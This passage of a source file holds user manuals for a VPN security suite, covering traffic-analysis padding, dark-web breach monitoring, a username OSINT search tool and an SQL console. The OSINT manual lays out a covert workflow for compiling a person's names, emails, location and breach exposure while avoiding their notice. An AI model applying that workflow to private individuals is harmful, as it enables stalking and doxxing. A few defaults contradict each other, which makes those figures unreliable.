    Query: ?algorithm=ml-kem-768|ml-dsa-65|both (default: both)
    Response: { kemPublicKey, kemSecretKey, dsaPublicKey, dsaSecretKey,
                keyId, generatedAt }

  POST /api/pqc/encapsulate
    Body: { publicKey: string }  (Base64 ML-KEM-768 public key)
    Response: { cipherText, sharedSecret, keyId }

  POST /api/pqc/decapsulate
    Body: { cipherText: string }  (Base64 — uses current session key)
    Response: { sharedSecret, keyId }

  POST /api/pqc/sign
    Body: { secretKey: string, message: string }
    Response: { signature: string, algorithm: "ML-DSA-65", bytes: 3293 }

  POST /api/pqc/verify
    Body: { publicKey: string, message: string, signature: string }
    Response: { valid: boolean, algorithm: "ML-DSA-65" }

  GET /api/pqc/offline-bundle
    Response: application/zip (contains all key files + wg config)

  GET /api/pqc/audit-chain
    Response: { ok, total, brokenAt, chainHead, algorithm, entries[] }

  POST /api/pqc/attest
    Returns a signed CNSA 2.0 compliance attestation document.
    Response: { attestation: string, signature: string, timestamp }

  GET /api/pqc/compliance
    Returns real-time CNSA 2.0 scorecard.
    Response: { score, controls[], overallCompliant, timestamp }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
All rights reserved. Unauthorized distribution prohibited.`,
  },
  {
    id: "daita-manual",
    title: "DAITA — Defense Against AI Traffic Analysis",
    subtitle: "Packet padding, timing jitter, dummy traffic, and constant bandwidth mode",
    version: "1.0",
    pages: 12,
    icon: Eye,
    iconColor: "text-indigo-400",
    tier: "pro",
    content: `DAITA — Defense Against AI Traffic Analysis — User Manual
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. What Traffic Analysis Reveals
2. How AI Website Fingerprinting Works
3. DAITA Technique 1 — Packet Padding
4. DAITA Technique 2 — Timing Jitter
5. DAITA Technique 3 — Dummy Traffic Injection
6. DAITA Technique 4 — Constant Bandwidth Mode
7. Enabling DAITA
8. Configuration Options
9. Performance Impact
10. What DAITA Does NOT Protect Against

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. WHAT TRAFFIC ANALYSIS REVEALS

  Even with a VPN active, an adversary who can observe your
  encrypted tunnel traffic (your ISP, a network monitor, a state
  surveillance system) can learn:

  • WHICH WEBSITES you visit — even without decrypting traffic
  • WHAT ACTIONS you take — loading a search results page vs.
    an article vs. a video has distinct packet size patterns
  • WHEN you are active — precisely which minutes you are online
  • WHAT APPLICATION is generating traffic — Netflix vs. Zoom vs.
    SSH has statistically distinct traffic signatures

  This is called Website Fingerprinting (WF). Research papers have
  demonstrated up to 95% accuracy in identifying websites from
  encrypted traffic patterns alone. Classifiers trained on WireGuard
  tunnel data can identify visited sites from packet metadata.

2. HOW AI WEBSITE FINGERPRINTING WORKS

  A WF attack requires:
  1. The attacker observes your encrypted traffic (ISP, tap)
  2. The attacker has a trained ML model (classifier)
  3. The model inputs: sequence of packet sizes + timing intervals
  4. The model outputs: "this is YouTube" or "this is Tor Browser"

  Features extracted from encrypted packets (without decryption):
  • Packet sizes (in bytes) — every website has a characteristic
    distribution of large vs. small packets
  • Inter-packet timing (microseconds between packets)
  • Burst patterns (groups of packets sent together)
  • Cumulative traffic curve shape
  • Number of cells (in Tor's case) or packets at each time

  Modern WF classifiers: Deep Fingerprinting (DF), Triplet Fingerprint,
  ESPRESSO — achieve 95%+ accuracy in closed-world settings.
  DAITA defeats these by making all traffic look statistically identical.

3. DAITA TECHNIQUE 1 — PACKET PADDING

  All outbound packets are padded to fixed bucket sizes:
  • 256 bytes (small — control, ping, DNS)
  • 512 bytes (medium — API responses)
  • 1024 bytes (large — web content)
  • 1448 bytes (maximum — MTU for most links)

  The real payload is encrypted inside the packet. The outside
  sees only: a stream of fixed-size packets.

  Before padding (vulnerable):
  GET / (40 bytes) → GET /index.html (1210 bytes) → GET /logo.png (4820 bytes)
  Pattern matches: loading a website's home page.

  After padding (protected):
  [1448] → [1448] → [1448] → [1448] → [1448]
  Pattern: indistinguishable — could be any website.

  Padding mode options:
  • Conservative: pad to nearest power-of-2 size bucket
  • Aggressive: pad ALL packets to maximum MTU size (1448)
    (Maximum protection, highest bandwidth overhead)
  • Adaptive: dynamically select bucket based on traffic type
    (Balanced protection and performance)

4. DAITA TECHNIQUE 2 — TIMING JITTER

  Random delay is injected per-packet before transmission:
  • Default jitter range: 1–50ms (uniform random)
  • Alternative: Gaussian distribution (μ=10ms, σ=5ms)
  • Alternative: Exponential distribution (Poisson-like)

  Before jitter (vulnerable):
  Packet 1: T=0ms, Packet 2: T=25ms, Packet 3: T=30ms
  This precise timing signature identifies the resource loading
  sequence of a specific website.

  After jitter (protected):
  Packet 1: T=0ms, Packet 2: T=37ms, Packet 3: T=82ms
  The randomization destroys the timing-based feature vector that
  WF classifiers rely on.

  Jitter range tradeoff:
  • Narrow jitter (1–5ms): better performance, lower protection
  • Wide jitter (1–100ms): maximum protection, noticeable latency
  • Default 1–50ms: balanced for most use cases

5. DAITA TECHNIQUE 3 — DUMMY TRAFFIC INJECTION

  Synthetic cover traffic is continuously injected into your
  VPN tunnel, even when no real traffic is flowing.

  Dummy traffic characteristics:
  • PRNG-generated data (cryptographically random payload)
  • Encrypted in the WireGuard tunnel (indistinguishable from real)
  • Rate: configurable (default: 10% of current average bandwidth)
  • Distribution: Poisson arrival process (mimics real traffic)
  • Dummy HTTPS-looking frames (same size distribution as real web)

  Why it works:
  WF classifiers analyze "idle periods" vs. "active periods".
  With dummy traffic, the classifier sees continuous activity —
  it cannot identify when real traffic starts or ends.

  Also defeats: traffic correlation attacks. An adversary
  watching both ends of your tunnel cannot correlate your
  traffic with a destination by timing gaps in the flow.

  Cover traffic rate (configurable):
  Off:         no dummy traffic (minimum overhead)
  Low (5%):    light noise, some protection
  Medium (20%): default — good balance
  High (50%):  strong protection, significant bandwidth use
  Constant:    see Technique 4

6. DAITA TECHNIQUE 4 — CONSTANT BANDWIDTH MODE

  Transmits at a fixed bandwidth rate regardless of actual usage.

  Your tunnel looks like:
  Idle:         [----][----][----][----][----]  ← constant 2 Mbps
  Streaming:    [----][----][----][----][----]  ← still constant 2 Mbps
  Nothing:      [----][----][----][----][----]  ← still constant 2 Mbps

  An adversary sees: constant flow. Completely indistinguishable.

  Rate options:
  • 256 Kbps — compatible with slow connections (cellular roaming)
  • 1 Mbps  — default
  • 5 Mbps  — for high-speed connections
  • 10 Mbps — maximum (requires fast upstream)

  NOTE: Constant Bandwidth Mode consumes exactly the configured
  bandwidth rate 24/7, even when you are not using the internet.
  Use only if you have an unmetered connection.

7. ENABLING DAITA

  DAITA (/daita) → Configure tab

  Step 1: Select techniques to enable:
    ☑ Packet Padding     (low overhead, high protection)
    ☑ Timing Jitter      (low overhead, high protection)
    ☑ Dummy Traffic      (medium overhead, very high protection)
    ☐ Constant Bandwidth  (high overhead, maximum protection)

  Step 2: Configure per-technique settings (Section 8).

  Step 3: Click "Enable DAITA".
  DAITA is applied to your active WireGuard tunnel immediately.
  No reconnect required.

  Status indicator: DAITA tab shows green "ACTIVE" badge.
  Dashboard: shows DAITA shield icon on active connection.

8. CONFIGURATION OPTIONS

  Packet Padding:
    Mode: Conservative / Aggressive / Adaptive (default: Adaptive)
    Custom bucket sizes: add/remove size buckets

  Timing Jitter:
    Range minimum: 0–100ms (default: 1ms)
    Range maximum: 1–500ms (default: 50ms)
    Distribution: Uniform / Gaussian / Exponential

  Dummy Traffic:
    Rate: percentage of average bandwidth (0–100%)
    Burst size: maximum dummy burst (default: 5 packets)
    Frame type: Random / HTTP-like / WireGuard-like

  Constant Bandwidth:
    Rate: 256 Kbps / 1 Mbps / 5 Mbps / 10 Mbps / Custom
    Overage handling: drop excess / queue excess

  Apply profile presets:
  • Stealth (journalist/activist): all 4 techniques, aggressive
  • Balanced (default): padding + jitter + medium dummy traffic
  • Performance: padding + light jitter only

9. PERFORMANCE IMPACT

  Latency added (per technique):
  Packet Padding:      < 0.1ms (local processing only)
  Timing Jitter:       1–50ms per packet (by design)
  Dummy Traffic (20%): negligible compute, +20% bandwidth
  Constant Bandwidth:  0ms additional latency

  Throughput impact:
  Padding (aggressive): up to 3× bandwidth usage (worst case)
  Jitter:               no throughput impact (delays, not drops)
  Dummy Traffic (20%):  +20% bandwidth usage
  Constant Bandwidth:   fixed regardless of actual need

  Recommended for interactive use (video calls, gaming):
  Use Adaptive padding + Light jitter (1–10ms) + no dummy traffic
  Constant Bandwidth is not suitable for latency-sensitive apps.

10. WHAT DAITA DOES NOT PROTECT AGAINST

  DAITA defeats passive traffic ANALYSIS. It does not:

  ✗ Hide that you are using a VPN
    → Your ISP still sees an encrypted WireGuard tunnel.
    → Use Obfuscation (/obfuscation) to hide VPN usage itself.

  ✗ Protect against active probing
    → An adversary can still probe your VPN endpoint directly.
    → Use Ghost Trap + Firewall to defend against active attackers.

  ✗ Guarantee against future ML advances
    → More powerful WF classifiers may partially break jitter+padding.
    → Constant Bandwidth Mode is the only theoretically-proven defense.

  ✗ Protect metadata that leaves the VPN tunnel
    → DNS queries not routed through VPN
    → WebRTC leaks (use Leak Detection to verify no leaks)

  For maximum traffic analysis resistance: DAITA + Post-Quantum +
  Obfuscation (obfs4/Snowflake) together.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "dark-web-monitor-manual",
    title: "Dark Web Monitor",
    subtitle: "Breach database monitoring, HIBP integration, wallet tracking, and dark web alerts",
    version: "1.1",
    pages: 12,
    icon: Search,
    iconColor: "text-red-400",
    tier: "basic",
    content: `Dark Web Monitor — User Manual
Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
VPN Basic Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. How Monitoring Works
3. Email Address Monitoring
4. Password Breach Check (HIBP)
5. Cryptocurrency Wallet Monitoring
6. Phone Number & Personal Data Monitoring
7. Dark Web Paste Site Monitoring
8. Alert System
9. Reading Breach Reports
10. Remediation Steps After a Breach

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The Dark Web Monitor (/dark-web) continuously monitors breach
  databases, dark web marketplaces, paste sites, and underground
  forums for your personal data. Get alerted the instant your
  email, password, phone number, or cryptocurrency wallet address
  appears in any known breach or data dump.

  Backend: Express API at /api/dark-web
  Frontend: /dark-web (VPN Basic)
  Data sources: HIBP API, custom breach DB, paste monitoring,
                blockchain address monitoring

  Privacy guarantee: your monitored data is checked using
  k-anonymity and hashing — the actual values are NEVER sent
  to any external service in readable form.

2. HOW MONITORING WORKS

  Email/Password checking (HIBP k-anonymity):
  Step 1: SHA-1 hash of the email or password is computed locally.
  Step 2: First 5 characters of the hash are sent to HIBP API.
  Step 3: HIBP returns all hashes starting with those 5 chars.
  Step 4: Local comparison checks if your full hash is in the list.
  → Your actual email or password NEVER leaves your device.

  Custom breach database:
  Proxyh VPN maintains a local breach database (updated daily)
  with hashed credentials from known breaches. Monitoring is done
  entirely locally against this database.

  Paste site monitoring:
  Automated crawlers scan Pastebin, Ghostbin, Rentry, and
  similar paste sites for email addresses, phone numbers, and
  cryptocurrency addresses matching your monitored identifiers.

3. EMAIL ADDRESS MONITORING

  Dark Web Monitor → Email tab → Add Email

  Add up to 10 email addresses for continuous monitoring.
  Each email is checked against:
  • Have I Been Pwned (HIBP) — 700+ breaches indexed
  • DeHashed breach database
  • LeakLookup
  • Custom paste site scraper

  Per breach, you see:
  • Breach name: which service was breached
  • Breach date: when the breach occurred
  • Verified: whether the breach is confirmed authentic
  • Data classes exposed: Passwords, Phone numbers, IP addresses,
    Physical addresses, Credit cards, Social Security Numbers,
    Health records, Sexual preferences, etc.
  • Record count: total users affected in that breach
  • Source: HIBP / custom / paste

  Severity color coding:
  RED    — passwords or payment data exposed
  ORANGE — personal identifiers (phone, address) exposed
  YELLOW — email address + name only (lower risk)

4. PASSWORD BREACH CHECK (HIBP)

  Dark Web Monitor → Password Check tab

  Enter any password to check if it appears in known breach dumps.
  Uses HIBP k-anonymity API (see Section 2 for privacy guarantee).

  Results:
  FOUND: [N] times — this exact password appears in breach databases.
  → The number indicates how commonly it appears. Any count > 0
    means this password MUST be changed immediately everywhere it's used.

  NOT FOUND — this password has not appeared in any indexed breach.
  → This does NOT mean the password is strong. Use it as a
    starting point for assessment only.

  Best practice:
  Check all your passwords — especially reused ones. Each FOUND
  result is a credential that an attacker with the breach dump can
  try directly (credential stuffing) against your other accounts.

5. CRYPTOCURRENCY WALLET MONITORING

  Dark Web Monitor → Wallets tab → Add Address

  Monitor Bitcoin and Ethereum wallet addresses for:
  • Appearance in dark web marketplace listings
    (wallets used in ransomware, drug markets, stolen funds)
  • Mention in paste sites or leak dumps
  • Incoming transactions from known-malicious addresses
    (ransomware wallets, sanctions-listed addresses)

  Bitcoin address monitoring:
  Checks address against:
  • OFAC (US Treasury) sanctions list
  • Known ransomware payment addresses
  • Darknet market seizure databases (Hydra, AlphaBay, etc.)
  • Blockchain transaction graph (funds received FROM flagged addrs)

  Ethereum address monitoring:
  Same as Bitcoin plus:
  • FinCEN SAR (Suspicious Activity Reports) related addresses
  • Known Tornado Cash input addresses
  • Hacked protocol treasury addresses (Ronin, Wormhole, etc.)

  Alert: if any of your monitored wallet addresses appears in
  a dark web context or receives funds from a flagged source,
  you receive an immediate breach alert.

6. PHONE NUMBER & PERSONAL DATA MONITORING

  Dark Web Monitor → Personal tab → Add Identifier

  Monitor phone numbers, national ID formats, and physical
  address components for appearance in breach databases.

  Phone number monitoring:
  Checks against:
  • Facebook, LinkedIn, Twitter mega-breach databases
  • Robocall/spam list appearances (your number sold to spammers)
  • SIM-swapping attack databases (your number targeted)
  • Dark web phone-to-SSN lookup services (your number auctioned)

  What to do if your phone number appears:
  1. Immediately contact your carrier and add a SIM-lock PIN.
  2. Enable 2FA via an authenticator app (not SMS) everywhere.
  3. Freeze your credit at all 3 bureaus (Equifax, Experian, TransUnion).
  4. Monitor for SIM-swap attempt: watch for sudden loss of mobile signal.

7. DARK WEB PASTE SITE MONITORING

  Dark Web Monitor → Paste Monitor tab

  Keyword-based monitoring of paste sites:
  Add keywords — email addresses, usernames, company name,
  domain names — to watch for.

  When a new paste containing your keyword appears:
  → Alert within 15 minutes
  → Full paste content shown in alert panel
  → Source paste URL (accessible via Tor through Onion Browser)
  → Confidence score: how likely this is about you (vs. coincidence)

  Common paste site findings:
  • Credential dumps: username:password pairs for your domain
  • Internal data leaks: employees dumping company data
  • Config files: leaked API keys, database connection strings
  • Personal data: doxxing posts containing your address/info

8. ALERT SYSTEM

  All breach alerts appear in Dark Web Monitor → Alerts tab.
  Real-time (no polling delay — webhook-based where supported).

  Alert types:
  🔴 CRITICAL — password or payment data in active breach dump
  🟠 HIGH     — personal identifiers (phone, SSN, address) exposed
  🟡 MEDIUM   — email exposed in breach (password unknown/hashed)
  🔵 INFO     — paste site mention (may or may not be your data)

  For each alert:
  • First detected: timestamp
  • Source: which database/paste site
  • Exact data exposed (redacted where sensitive)
  • Recommended action (per-alert remediation guide)
  • Dismiss: mark alert as acknowledged
  • Escalate: mark as unresolved, stays visible until actioned

9. READING BREACH REPORTS

  Each breach entry shows:
  Breach Name:    Name of the compromised service (e.g. "LinkedIn 2021")
  Date:           When the breach occurred (may differ from when announced)
  Added to DB:    When it was indexed in HIBP / our database
  Verified:       YES = confirmed by HIBP or security researcher
  PWN Count:      Total records in the breach (millions may be affected)
  Data Classes:   Specifically what types of data were exposed

  Data Class definitions:
  Passwords         → raw or hashed password exposed
  Email addresses   → email confirmed in breach
  Usernames         → account login username
  Phone numbers     → mobile/landline numbers
  Physical addresses → home or work address
  Government IDs     → SSN, passport, driver license numbers
  Payment cards      → credit/debit card numbers (may be partial)
  Health records     → medical history, prescriptions, diagnoses
  IP addresses       → historical IP addresses used with the account
  Dates of birth     → DOB for identity theft use

10. REMEDIATION STEPS AFTER A BREACH

  If PASSWORDS are exposed:
  1. Immediately change the password on the breached service.
  2. Check if you reused that password anywhere else.
  3. Change it on EVERY service where it was reused.
  4. Enable 2FA (TOTP app preferred over SMS) on the breached account.
  5. Check for unauthorized activity in the account's login history.

  If PAYMENT CARDS are exposed:
  1. Contact your bank immediately — request new card number.
  2. Review the last 90 days of transactions for unauthorized charges.
  3. Set up real-time transaction alerts if not already active.

  If PHONE NUMBERS are exposed:
  1. Add a SIM-lock / port freeze with your carrier.
  2. Replace SMS-based 2FA with authenticator apps everywhere.
  3. Monitor for SIM-swap attempts (carrier notification).

  If PHYSICAL ADDRESSES are exposed:
  1. Set up mail forwarding to detect identity theft via mail.
  2. Freeze credit at all 3 bureaus (free at annualcreditreport.com).
  3. Set up fraud alerts.

  If GOVERNMENT IDs (SSN) are exposed:
  1. Immediately freeze credit (Equifax, Experian, TransUnion).
  2. File an Identity Theft Report at identitytheft.gov.
  3. Place an extended fraud alert (7 years) vs. standard (1 year).
  4. Consider an IRS Identity Protection PIN.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "username-intel-manual",
    title: "Username Intelligence",
    subtitle: "OSINT username search across 100+ platforms, profile correlation, and dark web lookup",
    version: "1.0",
    pages: 12,
    icon: Search,
    iconColor: "text-pink-400",
    tier: "pro",
    content: `Username Intelligence — User Manual
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Platform Coverage (100+ platforms)
3. Running a Username Search
4. Reading Results
5. Profile Correlation Engine
6. Email & Real Name Discovery
7. Dark Web & Breach Database Search
8. Workflow: Username → Full OSINT Profile
9. Operational Security When Searching

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  Username Intelligence (/username-intel) performs OSINT-grade
  username searches simultaneously across 100+ platforms. Enter
  a username and receive a comprehensive intelligence report:
  profile links, linked emails, real names, locations, profile
  photos, bio data, associated accounts, and any appearances in
  breach databases.

  All searches are routed through Tor by default (see Section 9
  for OPSEC notes). No accounts or authentication required.

  LEGAL NOTICE: Only search for usernames with legitimate purpose.
  Searching for individuals without legal basis may violate privacy
  laws (GDPR, CCPA). This tool is for authorized OSINT, security
  research, and penetration testing with scope authorization only.

2. PLATFORM COVERAGE (100+ PLATFORMS)

  Social Media (24 platforms):
    Twitter/X, Instagram, Facebook, TikTok, YouTube, Pinterest,
    Tumblr, Mastodon, Snapchat, BeReal, Threads, LinkedIn (limited),
    VSCO, Flickr, Reddit, Quora, Medium, Substack, Minds, MeWe,
    Parler, Gab, Truth Social, Rumble

  Developer & Technical (20 platforms):
    GitHub (repos, gists, organizations, commit email),
    GitLab, Bitbucket, npm (package author), PyPI (package author),
    Crates.io (Rust), NuGet, HackerNews, Stack Overflow,
    Dev.to, Hashnode, CodePen, JSFiddle, Replit, CodeSandbox,
    Kaggle, Hugging Face, Devpost, Indie Hackers, Product Hunt

  Gaming (18 platforms):
    Steam, Xbox Gamertag, PlayStation Network, Epic Games,
    Roblox, Fortnite (via tracker), Valorant (Riot tracker),
    Minecraft, Discord (via Sherlock lookup), Twitch, Kick,
    YouTube Gaming, Overwolf, Itch.io, Game Jolt,
    Chess.com, Lichess, Faceit (CS2/FPS rank lookup)

  Forums & Communities (14 platforms):
    Reddit, 4chan (archived via FoolFuuka), 8kun (archived),
    Telegram public channels, Keybase, Hackforums, RaidForums DB,
    Nulled.to (frozen data), XDA Developers, Wilders Security,
    Bleeping Computer, BleepingHelp, Proboards, Invision communities

  Creative & Portfolio (10 platforms):
    Behance, Dribbble, ArtStation, DeviantArt, Wattpad,
    Soundcloud, Bandcamp, Spotify (artist search), Patreon, Ko-fi

  Dark Web & Breach (6 sources):
    Pastebin archive (10+ years of public pastes)
    Ghostbin archives
    DeHashed breach database (username field search)
    Breach compilation username index
    Dark web forum index (via Tor)
    RockYou2021 username list check

3. RUNNING A USERNAME SEARCH

  Username Intel (/username-intel) → Search tab

  Step 1: Enter the username to search.
  Step 2: Select search scope:
    Quick (30s): Social + Developer platforms only (40 platforms)
    Standard (90s): All surface web platforms (80 platforms)
    Full (3-5 min): All platforms including dark web (100+ platforms)

  Step 3: Select routing:
    Direct: fastest, but your ProxhqVPN IP is visible to platforms
    Tor: anonymous, slower — recommended for OPSEC (Section 9)
    Tor + SOCKS5 chain: maximum anonymity, slowest

  Step 4: Click "Search".
  Live results stream in as each platform responds.
  Color coding: green = found, grey = not found, red = error/rate-limited

  Concurrent platform checks: 15 simultaneous (rate-limited to avoid bans)

4. READING RESULTS

  For each platform where the username is FOUND:

  Platform name + link:       direct link to the profile page
  Status: FOUND / NOT FOUND / PRIVATE / RATE LIMITED / ERROR
  Profile data (where available):
    • Display name (real name or alias)
    • Profile bio / description
    • Profile photo URL
    • Follower/following count
    • Account creation date
    • Last activity date
    • Location (if declared)
    • Website / linked URL
    • Email (if publicly listed)

  Confidence: HIGH / MEDIUM / LOW
  • HIGH: username exists and profile data confirms same person
  • MEDIUM: username exists but no cross-confirming data
  • LOW: username exists but may be a different person (common username)

5. PROFILE CORRELATION ENGINE

  The Correlation Engine analyzes all found profiles to determine
  which ones belong to the same person vs. name collision.

  Correlation signals:
  • Same profile photo (perceptual hash comparison)
  • Same bio text or similar keywords
  • Same website URL linked in multiple profiles
  • Same location mentioned
  • Linked social handles in profile bios
  • Account creation dates clustering within same time period
  • Username variation patterns (john_doe, johndoe, john.doe)

  Correlation output:
  HIGH CONFIDENCE CLUSTER — profiles almost certainly same person.
  Combined profile card shows all cross-linked data in one view.

  POSSIBLE MATCH — partial overlap, may be same person.
  LIKELY DIFFERENT — different photo, different bio, different region.

  Use the correlation clusters to build a unified target profile
  from all matching accounts.

6. EMAIL & REAL NAME DISCOVERY

  For Developer platforms (GitHub, GitLab, npm, PyPI):
  • GitHub API: commits may include the committer's email address
    even if the profile email is hidden. The tool checks all
    public commits for email addresses in author/committer fields.
  • npm/PyPI: package author email often disclosed in package metadata.

  Real name discovery:
  • Cross-reference profile display names across all found accounts.
  • Look for name variations: "John Doe", "johnd", "J. Doe".
  • LinkedIn full name if profile is accessible.
  • GitHub profile name field.

  Aggregated output:
  Possible real names:   John Doe, John D.
  Possible emails:       john@example.com (from GitHub commit)
  Geographic indicators: San Francisco, CA (from LinkedIn + Twitter)

  NOTE: Only public data is used. No authenticated scraping.

7. DARK WEB & BREACH DATABASE SEARCH

  Full search scope includes:
  Pastebin archive:
  • 10+ years of public Pastebin posts indexed
  • Search for the username string
  • Context: credential dumps, leaks, doxxing posts
  • Results show paste date, context snippet, full paste link

  Breach compilation:
  • Username field in DeHashed breach database
  • Checks 15 billion+ breach records for username matches
  • Shows which services the username was registered on
  • Reveals password hash format (md5, bcrypt, plaintext)

  Dark web forum index (via Tor):
  • Searches known dark web forum archives
  • Looks for username in posts, registrations, mentions
  • Example forums indexed: RaidForums, Nulled, HackForums archives

  Results are flagged with:
  BREACH — username appeared in a data breach
  PASTE — username appeared in a paste dump
  DARK WEB — username mentioned on dark web resources

8. WORKFLOW: USERNAME → FULL OSINT PROFILE

  Step 1: Run Full Search on the target username.
  Step 2: Review Correlation Engine clusters — identify the right person.
  Step 3: Note all found platforms and profile data.
  Step 4: Check Developer platforms for email disclosure (GitHub commits).
  Step 5: Run Breach check on any discovered email via Dark Web Monitor.
  Step 6: Run OSINT Recon (/osint) on any discovered domain/website.
  Step 7: Compile full profile:
    - Real name (from GitHub/LinkedIn/npm)
    - Email addresses (from GitHub commits, npm, PyPI)
    - Geographic location (from multiple profiles)
    - Social graph (followers/following cross-analysis)
    - Professional history (LinkedIn if accessible)
    - Breach exposure (via Dark Web Monitor)
    - Dark web mentions (from breach DB and paste check)

  Export: Username Intel → Export → JSON or PDF report

9. OPERATIONAL SECURITY WHEN SEARCHING

  If you are investigating a subject who may be monitoring their
  own profile for viewer activity, take precautions:

  Always use Tor routing:
  → Platforms cannot see your real IP address or ProxhqVPN IP.
  → Profile view counts may still be incremented (unavoidable).

  Do not click direct links to found profiles:
  → Use the "Preview" button which fetches the page server-side.
  → Direct clicks from your browser increment view/follower counts
    and may appear in the subject's analytics.

  Avoid repeated searches in quick succession:
  → Rate limiting may trigger CAPTCHAs or temporary bans.
  → Use Standard scope (90s) rather than Full for follow-up checks.

  For truly covert OSINT:
  → Route all Username Intel traffic through:
    Tor + Double Hop VPN (VPN Coexistence → Double-Hop Mode)
  → Use Alt Identity (/alt-identity) for cover persona if you
    need to create accounts to access paywalled profile data.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "sql-interface-manual",
    title: "SQL Interface — 3-Mode Database Console",
    subtitle: "Local PostgreSQL (read-only), external DB full CRUD, and HTTP API → table mode",
    version: "1.2",
    pages: 14,
    icon: Database,
    iconColor: "text-green-400",
    tier: "pro",
    content: `SQL Interface — 3-Mode Database Console — User Manual
Version 1.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Admin Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Mode Summary
2. Mode 1 — Local DB (Read-Only)
3. Mode 2 — External PostgreSQL (Full CRUD)
4. Mode 3 — HTTP API Table
5. Schema Explorer
6. Connection Manager
7. Query History
8. Security Constraints
9. Common Queries Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & MODE SUMMARY

  The SQL Interface (/sql) provides a web-based database console
  with three independent modes of operation:

  MODE 1 — LOCAL DB (Read-Only)
    Direct read access to the ProxhqVPN PostgreSQL database.
    SELECT statements only. No INSERT/UPDATE/DELETE/DDL.
    All platform tables visible and queryable.

  MODE 2 — EXTERNAL POSTGRESQL (Full CRUD)
    Connect to any external PostgreSQL database (AWS RDS, Supabase,
    Neon, Railway, self-hosted). Full SQL access: SELECT, INSERT,
    UPDATE, DELETE, CREATE TABLE, DROP TABLE, etc.
    Multiple simultaneous connections supported.

  MODE 3 — HTTP API TABLE
    Execute HTTP GET/POST requests against any REST API and display
    the JSON response as a sortable, filterable data table.
    No database required — turns any API endpoint into a table.

  Backend: Express API at /api/sql
  Frontend: /sql (admin role required)

2. MODE 1 — LOCAL DB (READ-ONLY)

  Switch to: SQL Interface → tab "LOCAL DB"

  Available operations:
  • SELECT with all standard clauses (WHERE, JOIN, GROUP BY, ORDER BY,
    LIMIT, OFFSET, subqueries, CTEs, window functions, etc.)
  • EXPLAIN and EXPLAIN ANALYZE (query plan inspection)
  • Information schema queries

  BLOCKED operations:
  INSERT, UPDATE, DELETE, TRUNCATE, DROP, CREATE, ALTER, GRANT,
  REVOKE, VACUUM, COPY, pg_terminate_backend, and any function
  that modifies data.

  All 60+ ProxhqVPN tables are accessible:

  Core tables:
    nodes               — VPN node registry
    beacon_alerts       — spider/worm/beacon alerts
    silk_web_entities   — SilkWeb trapped entities
    firewall_rules      — active firewall rules
    blocked_ips         — blocked IP entries
    user_wg_configs     — per-user WireGuard configs
    canary_tokens       — deployed canary tokens
    canary_triggers     — token trigger log

  Intelligence tables:
    ghost_trace_observations  — behavioral analysis events
    ghost_trace_baselines     — per-peer traffic baselines
    attack_chain_scans        — Ghost Chain scan results
    attack_chain_findings     — individual chain findings

  QuantumAudit tables:
    scan_jobs           — audit job queue
    vulnerabilities     — per-scan vulnerability findings
    quantum_analyses    — post-quantum threat analysis
    quantum_threats     — detected quantum-vulnerable algorithms

  Ambassador tables:
    ambassadors         — ambassador profiles
    ambassador_videos   — ambassador video entries
    ambassador_referrals — referral tracking

  Example queries:

  Recent beacon alerts (last 24 hours):
    SELECT alert_type, source_ip, destination_ip, probe_type,
           created_at
    FROM beacon_alerts
    WHERE created_at > NOW() - INTERVAL '24 hours'
    ORDER BY created_at DESC
    LIMIT 100;

  Top blocked IPs by hit count:
    SELECT ip_address, reason, hit_count, last_seen
    FROM blocked_ips
    ORDER BY hit_count DESC
    LIMIT 25;

  Active WireGuard nodes with peer count:
    SELECT n.id, n.ip_address, n.location, n.status,
           COUNT(uwc.id) AS peer_count
    FROM nodes n
    LEFT JOIN user_wg_configs uwc ON uwc.node_id = n.id
    GROUP BY n.id
    ORDER BY peer_count DESC;

3. MODE 2 — EXTERNAL POSTGRESQL (FULL CRUD)

  Switch to: SQL Interface → tab "EXTERNAL DB"

  Step 1 — Add a connection:
    SQL Interface → Connections → + Add Connection
    Connection string format:
      postgresql://username:password@host:5432/dbname
      postgresql://username:password@host:5432/dbname?sslmode=require

    Or fill individual fields:
    Host:     your-db.region.rds.amazonaws.com
    Port:     5432
    Database: myapp_production
    Username: admin
    Password: ******* (masked in UI)
    SSL:      Required / Preferred / Disabled

    Click "Test Connection" before saving.
    Connection pool: max 10 connections per external DB.

  Step 2 — Select connection from dropdown.
  Step 3 — Run any SQL.

  Full CRUD and DDL is allowed:
    SELECT, INSERT, UPDATE, DELETE, TRUNCATE
    CREATE TABLE, ALTER TABLE, DROP TABLE
    CREATE INDEX, CREATE VIEW
    BEGIN, COMMIT, ROLLBACK (transaction support)

  Connection security:
  • Connection strings are stored in memory only (not persisted).
  • Credentials are masked in the UI and never logged.
